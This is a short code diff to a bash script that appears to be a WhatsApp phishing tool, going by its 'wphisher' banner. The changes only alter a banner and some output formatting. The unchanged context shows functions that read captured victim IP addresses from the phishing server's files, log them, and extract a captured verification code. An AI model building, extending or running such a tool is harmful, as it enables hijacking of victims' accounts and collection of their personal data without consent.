@@ -103,9 +103,13 @@ ${WHITE}|___/\__,_||___/\__,_|_| |_| |_|\___|
 EOF
 }
 
+banner_viu(){
+    viu image/wphisher.png
+}
+
 banner(){
     clear
-    banner_py
+    banner_viu
     echo -e "\n${WHITE}-- =[ Program Created by ~> sasame"
 
 timeout 3s curl -fIs "https://www.xvideos.com" > /dev/null
@@ -298,7 +302,7 @@ EOF
 ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
     IFS=$'\n'
-	echo -e "${WHITE}[-] IP : $IP\n"
+	echo -e "${WHITE}IP : $IP\n"
     cat .server/www/ip.txt >> auth/ip.dat
 }
 
@@ -306,7 +310,7 @@ ip() {
 cod(){
  cod=$(grep -o 'Cod:.*' .server/www/cod.txt | awk -F ":." '{print  $NF}')
  IFS=$'\n'
- echo -e "${WHITE}[-] Cod : $cod\n"
+ echo -e "${WHITE}Cod : $cod\n"
 }
 
 location() {
